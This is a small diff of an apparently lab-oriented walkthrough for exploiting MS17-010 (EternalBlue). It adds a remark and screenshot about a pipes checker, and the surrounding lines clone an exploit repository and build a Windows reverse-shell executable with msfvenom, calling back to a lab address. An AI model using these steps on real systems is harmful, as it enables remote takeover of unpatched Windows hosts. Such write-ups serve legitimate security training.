@@ -21,6 +21,11 @@ https://github.com/k4u5h41/MS17-010_CVE-2017-0143
 
 ``git clone https://github.com/k4u5h41/MS17-010_CVE-2017-0143``
 
+### There is no need for it for this exploit but the pipes checker works very well :
+
+![blue2](https://user-images.githubusercontent.com/123066149/219165990-17752e32-6dfb-4b7a-ba59-a86b0c56e03f.PNG)
+
+
 ``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=1234 -f exe -o ms17-010.exe``
 
 ### Change the username to make it work in the exploit 
